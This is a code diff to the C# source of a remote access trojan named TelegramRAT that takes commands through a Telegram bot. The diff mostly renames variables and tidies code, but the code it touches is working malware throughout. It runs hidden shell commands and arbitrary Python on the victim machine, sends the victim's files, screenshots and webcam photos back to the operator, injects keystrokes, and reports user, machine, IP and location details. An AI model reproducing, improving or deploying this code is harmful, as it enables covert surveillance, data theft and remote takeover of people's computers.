@@ -32,21 +32,21 @@ namespace TelegramRAT
         readonly static long? OwnerId = null; // Place your Telegram id here or keep it null.
         readonly static string BotToken = null; // Place your Telegram bot token. 
 
-        static List<BotCommand> commands = new List<BotCommand>();
+        static List<BotCommand> Commands = new List<BotCommand>();
         static bool keylog = false;
 
-        static ScriptScope pythonScope;
-        static ScriptEngine pythonEngine;
-        static ScriptRuntime pythonRuntime;
+        static ScriptScope PythonScope;
+        static ScriptEngine PythonEngine;
+        static ScriptRuntime PythonRuntime;
 
-        static int pollingDelay = 1000;
+        static int PollingDelay = 1000;
 
         static void Main(string[] args)
         {
 
-            string thisprocessname = Process.GetCurrentProcess().ProcessName;
+            string thisProcessName = Process.GetCurrentProcess().ProcessName;
 
-            if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
+            if (Process.GetProcesses().Count(p => p.ProcessName == thisProcessName) > 1)
             {
                 Console.WriteLine("Only one instance could be online at the same time!");
                 return;
@@ -54,15 +54,14 @@ namespace TelegramRAT
 
             Bot = new TelegramBotClient(BotToken);
 
-            pythonRuntime = Python.CreateRuntime();
-            pythonEngine = Python.CreateEngine();
-            pythonScope = pythonRuntime.CreateScope();
+            PythonRuntime = Python.CreateRuntime();
+            PythonEngine = Python.CreateEngine();
+            PythonScope = PythonRuntime.CreateScope();
 
-            InitializeCommands(commands);
-            Run().Wait();
+            InitializeCommands(Commands);
             try
             {
-
+                Run().Wait();
             }
             catch (Exception ex)
             {
@@ -75,7 +74,7 @@ namespace TelegramRAT
                 }
 
                 Bot.SendTextMessageAsync(OwnerId, "Attempting to restart. Please wait...");
-                commands.Clear();
+                Commands.Clear();
                 Main(args);
             }
         }
@@ -88,8 +87,6 @@ namespace TelegramRAT
             await Bot.SendTextMessageAsync(message.Chat.Id, "Error: " + exception.Message, replyToMessageId: message.MessageId);
 #endif
         }
-
-
 
         static async Task Run()
         {
@@ -117,7 +114,7 @@ namespace TelegramRAT
 
                 UpdateWorker(updates).Wait();
 
-                Task.Delay(pollingDelay).Wait();
+                Task.Delay(PollingDelay).Wait();
             }
         }
 
@@ -132,12 +129,12 @@ namespace TelegramRAT
                 if (model == null)
                     continue;
 
-                var cmd = commands.Find(cmd => cmd.Command == model.Command);
+                var cmd = Commands.Find(cmd => cmd.Command == model.Command);
 
 
                 if (cmd == null)
                 {
-                    cmd = commands.Find(cmd => cmd.Aliases != null && cmd.Aliases.Contains(model.Command));
+                    cmd = Commands.Find(cmd => cmd.Aliases != null && cmd.Aliases.Contains(model.Command));
                     if (cmd == null)
                     {
                         continue;
@@ -161,7 +158,7 @@ namespace TelegramRAT
             }
         }
 
-        
+
 
         //Evil and scary method
         static bool ValidateModel(BotCommand command, BotCommandModel model)
@@ -260,31 +257,31 @@ namespace TelegramRAT
                     }
                     string command = model.Args[0];
 
-                    var cmd = commands.Find(cmd => cmd.Command == command || (cmd.Aliases != null && cmd.Aliases.Contains(command)));
+                    var cmd = Commands.Find(cmd => cmd.Command == command || (cmd.Aliases != null && cmd.Aliases.Contains(command)));
                     if (cmd == null)
                     {
                         await Bot.SendTextMessageAsync(model.Message.Chat.Id, "This command doesn't exist! " +
                         "To get list of all commands - type /commands", replyToMessageId: model.Message.MessageId);
                         return;
                     }
-                    string Description = $"<b>{cmd.Command.ToUpper()}</b>\n";
+                    string commandDescription = $"<b>{cmd.Command.ToUpper()}</b>\n";
                     if (cmd.Aliases != null && cmd.Aliases.Length != 0)
                     {
-                        Description += $"Aliases: {string.Join(' ', cmd.Aliases)}\n"; 
+                        commandDescription += $"Aliases: {string.Join(' ', cmd.Aliases)}\n";
                     }
                     if (cmd.Description != null)
                     {
-                        Description += "\n" + cmd.Description;
+                        commandDescription += "\n" + cmd.Description;
                     }
                     else
                     {
-                        Description += "\n<i>No description provided</i>";
+                        commandDescription += "\n<i>No description provided</i>";
                     }
                     if (cmd.Example != null)
                     {
-                        Description += $"\nExample: {cmd.Example}";
+                        commandDescription += $"\nExample: {cmd.Example}";
                     }
-                    await Bot.SendTextMessageAsync(model.Message.Chat.Id, Description, replyToMessageId: model.Message.MessageId, parseMode: ParseMode.Html, disableWebPagePreview: true);
+                    await Bot.SendTextMessageAsync(model.Message.Chat.Id, commandDescription, replyToMessageId: model.Message.MessageId, parseMode: ParseMode.Html, disableWebPagePreview: true);
                 }
             });
 
@@ -299,7 +296,6 @@ namespace TelegramRAT
                 {
                     try
                     {
-
                         Process cmd = new Process();
                         cmd.StartInfo.FileName = "cmd.exe";
                         cmd.StartInfo.CreateNoWindow = true;
@@ -314,15 +310,15 @@ namespace TelegramRAT
                         cmd.WaitForExit(1000);
                         //cmd.Kill(true);
 
-                        string Output = await cmd.StandardOutput.ReadToEndAsync();
+                        string output = await cmd.StandardOutput.ReadToEndAsync();
 
-                        Output = string.Join(string.Empty, Output.Take(4096));
+                        output = string.Join(string.Empty, output.Take(4096));
 
-                        if (Output.Length == 0)
+                        if (output.Length == 0)
                             await Bot.SendTextMessageAsync(model.Message.Chat.Id, $"Done!", replyToMessageId: model.Message.MessageId);
                         else
                             await Bot.SendTextMessageAsync(model.Message.Chat.Id, $"Done!\n\n" +
-                                $"Output:\n{Output}", replyToMessageId: model.Message.MessageId);
+                                $"Output:\n{output}", replyToMessageId: model.Message.MessageId);
                     }
                     catch (Exception ex)
                     {
@@ -351,49 +347,45 @@ namespace TelegramRAT
                         else
                             curdir = Directory.GetCurrentDirectory();
 
-
                         var files = Directory.EnumerateFiles(curdir);
                         int i = 0;
-                        string oneMessage;
+                        StringBuilder dirEntities = new StringBuilder();
                         if (files.Count() != 0)
                         {
-                            oneMessage = "Files:\n\n";
+                            dirEntities.AppendLine("Files:\n");
                             foreach (string file in files)
                             {
-                                string parsedFile = file.Substring(file.LastIndexOf('\\') + 1);
+                                dirEntities.AppendLine($"<code>{file.Substring(file.LastIndexOf('\\') + 1)}</code>");
                                 if (i == 100)
                                 {
-                                    await Bot.SendTextMessageAsync(model.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);
+                                    await Bot.SendTextMessageAsync(model.Message.Chat.Id, dirEntities.ToString(), parseMode: ParseMode.Html);
                                     i = 0;
-                                    oneMessage = "";
+                                    dirEntities.Clear();
                                 }
                                 i++;
-                                oneMessage += $"`{parsedFile}`\n";
-
                             }
-                            await Bot.SendTextMessageAsync(model.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);
+                            await Bot.SendTextMessageAsync(model.Message.Chat.Id, dirEntities.ToString(), parseMode: ParseMode.Html);
 
                         }
+                        dirEntities.Clear();
 
                         var dirs = Directory.EnumerateDirectories(curdir);
                         i = 0;
                         if (dirs.Count() != 0)
                         {
-                            oneMessage = "Folders:\n\n";
+                            dirEntities.AppendLine("Folders:\n");
                             foreach (string dir in dirs)
                             {
-                                string parsedDir = dir.Substring(dir.LastIndexOf('\\') + 1);
+                                dirEntities.AppendLine($"<code>{dir.Substring(dir.LastIndexOf('\\') + 1)}</code>");
                                 if (i == 100)
                                 {
-                                    await Bot.SendTextMessageAsync(model.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);
+                                    await Bot.SendTextMessageAsync(model.Message.Chat.Id, dirEntities.ToString(), parseMode: ParseMode.Html);
                                     i = 0;
-                                    oneMessage = "";
+                                    dirEntities.Clear();
                                 }
                                 i++;
-                                oneMessage += $"`{parsedDir}`\n";
-
                             }
-                            await Bot.SendTextMessageAsync(model.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);
+                            await Bot.SendTextMessageAsync(model.Message.Chat.Id, dirEntities.ToString(), parseMode: ParseMode.Html);
 
                         }
                         if (dirs.Count() == 0 && files.Count() == 0)
@@ -671,15 +663,15 @@ namespace TelegramRAT
                 {
                     try
                     {
-                        var filetodownload = model.RawArgs;
-                        if (!System.IO.File.Exists(Directory.GetCurrentDirectory() + "\\" + filetodownload))
+                        string filePath = model.RawArgs;
+                        if (!System.IO.File.Exists(Directory.GetCurrentDirectory() + "\\" + filePath))
                         {
-                            await Bot.SendTextMessageAsync(model.Message.Chat.Id, $"There is no file \"{filetodownload}\" at dir {Directory.GetCurrentDirectory()}");
+                            await Bot.SendTextMessageAsync(model.Message.Chat.Id, $"There is no file \"{filePath}\" at dir {Directory.GetCurrentDirectory()}");
                             return;
                         }
-                        var filetosend = new FileStream(Directory.GetCurrentDirectory() + "\\" + filetodownload, FileMode.Open, FileAccess.Read, FileShare.Read);
+                        using FileStream fileStream = new FileStream(Directory.GetCurrentDirectory() + "\\" + filePath, FileMode.Open, FileAccess.Read, FileShare.Read);
                         {
-                            await Bot.SendDocumentAsync(model.Message.Chat.Id, new InputOnlineFile(filetosend, filetosend.Name.Substring(filetosend.Name.LastIndexOf("\\"))), caption: filetodownload);
+                            await Bot.SendDocumentAsync(model.Message.Chat.Id, new InputOnlineFile(fileStream, fileStream.Name.Substring(fileStream.Name.LastIndexOf("\\"))), caption: filePath);
                         }
                     }
                     catch (Exception ex)
@@ -704,10 +696,10 @@ namespace TelegramRAT
                         Rectangle bounds = WinAPI.GetScreenBounds();
 
                         using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
-                        using (Graphics g = Graphics.FromImage(bitmap))
+                        using (Graphics graphics = Graphics.FromImage(bitmap))
                         using (MemoryStream screenshotStream = new MemoryStream())
                         {
-                            g.CopyFromScreen(System.Drawing.Point.Empty, System.Drawing.Point.Empty, bounds.Size);
+                            graphics.CopyFromScreen(System.Drawing.Point.Empty, System.Drawing.Point.Empty, bounds.Size);
 
                             bitmap.Save(screenshotStream, ImageFormat.Png);
 
@@ -757,33 +749,33 @@ namespace TelegramRAT
                     {
                         try
                         {
-                            Bitmap endMap;
-                            MemoryStream webcamShotStream = new MemoryStream();
+                            Bitmap photoBitmap;
+                            MemoryStream photoStream = new MemoryStream();
 
-                            FilterInfoCollection capdevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
-                            if (capdevices.Count == 0)
+                            FilterInfoCollection captureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                            if (captureDevices.Count == 0)
                             {
-                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "This machine has no webcamera.", replyToMessageId: model.Message.MessageId);
+                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "This pc has no webcamera.", replyToMessageId: model.Message.MessageId);
                             }
 
-                            VideoCaptureDevice device = new VideoCaptureDevice(capdevices[0].MonikerString);
+                            VideoCaptureDevice device = new VideoCaptureDevice(captureDevices[0].MonikerString);
                             device.NewFrame += (sender, args) =>
                             {
                                 //args.Frame = webcamShotStream;
 
-                                endMap = args.Frame.Clone() as Bitmap;
-                                endMap.Save(webcamShotStream, ImageFormat.Png);
+                                photoBitmap = args.Frame.Clone() as Bitmap;
+                                photoBitmap.Save(photoStream, ImageFormat.Png);
                                 (sender as VideoCaptureDevice).SignalToStop();
                             };
 
                             device.Start();
                             device.WaitForStop();
 
-                            webcamShotStream.Position = 0;
+                            photoStream.Position = 0;
 
-                            InputOnlineFile webcamPhoto = new InputOnlineFile(webcamShotStream);
-                            Bot.SendPhotoAsync(model.Message.Chat.Id, webcamPhoto, replyToMessageId: model.Message.MessageId);
-                            webcamShotStream.Close();
+                            InputOnlineFile photoOnlineFile = new InputOnlineFile(photoStream);
+                            Bot.SendPhotoAsync(model.Message.Chat.Id, photoOnlineFile, replyToMessageId: model.Message.MessageId);
+                            photoStream.Close();
                         }
                         catch (Exception ex)
                         {
@@ -829,17 +821,18 @@ namespace TelegramRAT
                 IgnoreCountArgs = true,
 
                 Description = "Open URL with default browser.",
-                Example = "/openurl https://google.com",
+                Example = "/openurl google.com",
                 Execute = async model =>
                 {
-                    if (!model.RawArgs.Contains("://"))
+                    string url = model.RawArgs;
+                    if (url.Contains("://") is false)
                     {
-                        await Bot.SendTextMessageAsync(model.Message.Chat.Id, "This is not url", replyToMessageId: model.Message.MessageId);
+                        url = "https://" + url;
                     }
                     ProcessStartInfo info = new ProcessStartInfo()
                     {
                         FileName = "cmd.exe",
-                        Arguments = $"/c start {model.RawArgs}",
+                        Arguments = $"/c start {url}",
                         CreateNoWindow = true
                     };
 
@@ -868,11 +861,11 @@ namespace TelegramRAT
                         }
                         foreach (var file in model.Files)
                         {
-                            FileStream fs = new FileStream(model.Filename ?? file.FileUniqueId + ".jpg", FileMode.Create);
-                            var telegramFile = await Bot.GetFileAsync(file.FileId);
-
-                            await Bot.DownloadFileAsync(telegramFile.FilePath, fs);
-                            fs.Close();
+                            using FileStream fileStream = new FileStream(model.Filename ?? file.FileUniqueId + ".jpg", FileMode.Create);
+                            {
+                                var telegramFile = await Bot.GetFileAsync(file.FileId);
+                                await Bot.DownloadFileAsync(telegramFile.FilePath, fileStream);
+                            }
                         }
                         await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                     }
@@ -908,23 +901,23 @@ namespace TelegramRAT
                    {
                        try
                        {
-                           KeyboardSimulator ks = new KeyboardSimulator(new InputSimulator());
+                           KeyboardSimulator keyboardSimulator = new KeyboardSimulator(new InputSimulator());
                            foreach (string arg in model.Args)
                            {
                                if (arg.Contains("+"))
                                {
-                                   int modifier = int.Parse(arg.Split('+').First(), System.Globalization.NumberStyles.HexNumber);
-                                   List<int> modified = new List<int>();
-                                   foreach (string vk in arg.Split('+').Skip(1))
+                                   List<int> modifiedKeys = new List<int>();
+                                   foreach (string vk in arg.Split('+'))
                                    {
-                                       modified.Add(int.Parse(vk, System.Globalization.NumberStyles.HexNumber));
+                                       modifiedKeys.Add(int.Parse(vk, System.Globalization.NumberStyles.HexNumber));
                                    }
-                                   ks.ModifiedKeyStroke(new int[] { modifier }, modified);
+                                   keyboardSimulator.ModifiedKeyStroke(new int[] { modifiedKeys[0] }, modifiedKeys.Skip(1));
                                }
                                else
-                                   ks.KeyPress(int.Parse(arg, System.Globalization.NumberStyles.HexNumber));
+                               {
+                                   keyboardSimulator.KeyPress(int.Parse(arg, System.Globalization.NumberStyles.HexNumber));
+                               }
                            }
-
                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "Sended!", replyToMessageId: model.Message.MessageId);
                        }
                        catch (Exception ex)
@@ -952,11 +945,12 @@ namespace TelegramRAT
                             await Bot.SendTextMessageAsync(model.Message.Chat.Id, "No image or file provided.", replyToMessageId: model.Message.MessageId);
                             return;
                         }
-                        var tgfile = await Bot.GetFileAsync(model.Files.Last().FileId);
+                        var telegramFile = await Bot.GetFileAsync(model.Files.Last().FileId);
 
                         using (FileStream wallpapperImageFileStream = new FileStream(Path.GetTempPath() + "wllppr.jpg", FileMode.Create))
-                            await Bot.DownloadFileAsync(tgfile.FilePath, wallpapperImageFileStream);
-
+                        {
+                            await Bot.DownloadFileAsync(telegramFile.FilePath, wallpapperImageFileStream);
+                        }
                         WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, Path.GetTempPath() + "wllppr.jpg", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
                         System.IO.File.Delete(Path.GetTempPath() + "wllppr.jpg");
                         await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
@@ -1014,7 +1008,7 @@ namespace TelegramRAT
 
                                 Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
 
-                                string info =
+                                string windowInfo =
                                 "Window info\n" +
                                 "\n" +
                                 $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
@@ -1024,13 +1018,13 @@ namespace TelegramRAT
 
                                 $"Associated Process: <code>{WinAPI.GetProcessId(WinAPI.GetProcessHandleFromWindow(hWnd))}</code>";
 
-                                MemoryStream windowCap = new MemoryStream();
+                                MemoryStream windowCaptureStream = new MemoryStream();
 
-                                Utils.CaptureWindow(hWnd, windowCap);
+                                Utils.CaptureWindow(hWnd, windowCaptureStream);
 
-                                windowCap.Position = 0;
+                                windowCaptureStream.Position = 0;
 
-                                Bot.SendPhotoAsync(model.Message.Chat.Id, windowCap, info, replyToMessageId: model.Message.MessageId, parseMode: ParseMode.Html);
+                                Bot.SendPhotoAsync(model.Message.Chat.Id, windowCaptureStream, windowInfo, replyToMessageId: model.Message.MessageId, parseMode: ParseMode.Html);
 
                                 return;
                             }
@@ -1136,11 +1130,11 @@ namespace TelegramRAT
                             case "i":
                             case "info":
                                 string mouseInfo;
-                                Point cursorPos = new Point();
-                                if (WinAPI.GetCursorPos(out cursorPos))
+                                Point cursorPosition = new Point();
+                                if (WinAPI.GetCursorPos(out cursorPosition))
                                 {
                                     mouseInfo =
-                                    $"Cursor position: x:{cursorPos.X} y:{cursorPos.Y}";
+                                    $"Cursor position: x:{cursorPosition.X} y:{cursorPosition.Y}";
                                 }
                                 else
                                 {
@@ -1508,7 +1502,7 @@ namespace TelegramRAT
                 Execute = async model =>
                 {
                     StringBuilder commandsList = new StringBuilder("List of all commands:\n\n");
-                    foreach (BotCommand command in commands.OrderBy(x => x.Command))
+                    foreach (BotCommand command in Commands.OrderBy(x => x.Command))
                     {
                         commandsList.AppendLine("/" + command.Command);
                     }
@@ -1620,9 +1614,9 @@ namespace TelegramRAT
                     {
                         if (System.IO.File.Exists(model.Args[0]) && !System.IO.File.Exists($"{Path.GetDirectoryName(model.Args[0])}\\{model.Args[1]}"))
                         {
-                            string fileToRename = Path.GetFullPath(model.Args[0]);
-                            string newFileName = $"{Path.GetDirectoryName(fileToRename)}\\{model.Args[1]}";
-                            System.IO.File.Move(fileToRename, newFileName);
+                            string filePath = Path.GetFullPath(model.Args[0]);
+                            string newFileName = $"{Path.GetDirectoryName(filePath)}\\{model.Args[1]}";
+                            System.IO.File.Move(filePath, newFileName);
                             await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                         }
                         else
@@ -1692,9 +1686,9 @@ namespace TelegramRAT
                                 }
                                 MemoryStream pyOutput = new MemoryStream();
                                 var pyStream = new MemoryStream();
-                                pythonEngine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);
+                                PythonEngine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);
 
-                                pythonEngine.Execute(model.RawArgs, pythonScope);
+                                PythonEngine.Execute(model.RawArgs, PythonScope);
                                 pyStream.Position = 0;
 
                                 if (pyStream.Length > 0)
@@ -1713,13 +1707,13 @@ namespace TelegramRAT
                             {
                                 MemoryStream outputStream = new MemoryStream();
                                 var scriptFileStream = System.IO.File.Create("UserScript.py");
-                                pythonEngine.Runtime.IO.SetOutput(outputStream, Encoding.UTF8);
+                                PythonEngine.Runtime.IO.SetOutput(outputStream, Encoding.UTF8);
 
                                 var file = Bot.GetFileAsync(model.Files[0].FileId).Result;
                                 Bot.DownloadFileAsync(file.FilePath, scriptFileStream).Wait();
                                 scriptFileStream.Close();
 
-                                pythonEngine.ExecuteFile("UserScript.py", pythonScope);
+                                PythonEngine.ExecuteFile("UserScript.py", PythonScope);
 
                                 outputStream.Position = 0;
 
@@ -1757,7 +1751,7 @@ namespace TelegramRAT
                 Description = "Clear python execution scope.",
                 Execute = async model =>
                 {
-                    pythonScope = pythonEngine.CreateScope();
+                    PythonScope = PythonEngine.CreateScope();
                     await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Cleared!", replyToMessageId: model.Message.MessageId);
                 }
 
@@ -1848,9 +1842,9 @@ namespace TelegramRAT
                 Description = "Ping bot to check if it's work",
                 Execute = async model =>
                 {
-                    var pingmessage = await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Ping!", replyToMessageId: model.Message.MessageId);
+                    var pingMessage = await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Ping!", replyToMessageId: model.Message.MessageId);
 
-                    string elapsedTime = (pingmessage.Date - model.Message.Date).TotalMilliseconds.ToString();
+                    string elapsedTime = (pingMessage.Date - model.Message.Date).TotalMilliseconds.ToString();
 
                     await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Elapsed time: " + elapsedTime, replyToMessageId: model.Message.MessageId);
                 }
@@ -1870,18 +1864,32 @@ namespace TelegramRAT
                         await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Reply to message", replyToMessageId: model.Message.MessageId);
                         return;
                     }
-                    BotCommandModel newmodel = BotCommandModel.FromMessage(model.Message.ReplyToMessage, string.Empty);
+                    BotCommandModel replyMessageModel = BotCommandModel.FromMessage(model.Message.ReplyToMessage, string.Empty);
 
-                    if (newmodel == null)
+                    if (replyMessageModel == null)
                     {
                         await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Unable to repeat command from this message");
                         return;
                     }
 
-                    var cmd = CommandsList.Find(command => command.Command == newmodel.Command);
+                    var cmd = CommandsList.Find(command => command.Command == replyMessageModel.Command);
 
-                    if (ValidateModel(cmd, newmodel))
-                        await cmd.Execute(newmodel);
+                    if (cmd == null)
+                    {
+                        cmd = Commands.Find(cmd => cmd.Aliases != null && cmd.Aliases.Contains(replyMessageModel.Command));
+                        if (cmd == null)
+                        {
+                            await Bot.SendTextMessageAsync(model.Message.Chat.Id, "This message does not contain command");
+                            return;
+                        }
+                        else
+                        {
+                            replyMessageModel.Command = cmd.Command;
+                        }
+                    }
+
+                    if (ValidateModel(cmd, replyMessageModel))
+                        await cmd.Execute(replyMessageModel);
                     else
                         await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Unable to repeat command from this message");
                 }
@@ -1897,7 +1905,7 @@ namespace TelegramRAT
                 {
                     try
                     {
-                        string sysInfo =
+                        string systemInfoString =
                         $"User name: {Environment.UserName}\n" +
                         $"PC name: {Environment.MachineName}\n\n" +
 
@@ -1907,7 +1915,7 @@ namespace TelegramRAT
                         $"To get ip address and other network info type /netinfo";
 
 
-                        await Bot.SendTextMessageAsync(model.Message.Chat.Id, sysInfo, replyToMessageId: model.Message.MessageId);
+                        await Bot.SendTextMessageAsync(model.Message.Chat.Id, systemInfoString, replyToMessageId: model.Message.MessageId);
                     }
                     catch (Exception ex)
                     {
@@ -1959,25 +1967,25 @@ namespace TelegramRAT
                 Example = "/netinfo",
                 Execute = async model =>
                 {
-                    string ipaddr = await Utils.GetIpAddress();
+                    string ipAddress = await Utils.GetIpAddress();
                     HttpClient httpClient = new HttpClient();
-                    string ipinfo = await httpClient.GetStringAsync("http://ip-api.com/xml/" + ipaddr);
-                    System.Xml.XmlDocument doc = new System.Xml.XmlDocument();
-                    doc.LoadXml(ipinfo);
+                    string ipApiResponse = await httpClient.GetStringAsync("http://ip-api.com/xml/" + ipAddress);
+                    System.Xml.XmlDocument xmlDocument = new System.Xml.XmlDocument();
+                    xmlDocument.LoadXml(ipApiResponse);
 
-                    TextReader reader = new StringReader(doc.ChildNodes[1].OuterXml);
+                    TextReader xmlDocumentReader = new StringReader(xmlDocument.ChildNodes[1].OuterXml);
                     var serializer = new System.Xml.Serialization.XmlSerializer(typeof(NetworkInfo));
-                    NetworkInfo ni = serializer.Deserialize(reader) as NetworkInfo;
+                    NetworkInfo ni = serializer.Deserialize(xmlDocumentReader) as NetworkInfo;
 
-                    string netinfo = "Network information:\n\n" +
-                    $"IP: {ipaddr}\n" +
+                    string networkInformationString = "Network information:\n\n" +
+                    $"IP: {ipAddress}\n" +
                     $"ISP: {ni.Isp}\n" +
                     $"Country: {ni.Country}\n" +
                     $"City: {ni.City}\n" +
                     $"Timezone: {ni.Timezone}\n" +
                     $"Country Code: {ni.CountryCode}";
 
-                    await Bot.SendTextMessageAsync(model.Message.Chat.Id, netinfo);
+                    await Bot.SendTextMessageAsync(model.Message.Chat.Id, networkInformationString);
                 }
             });
 
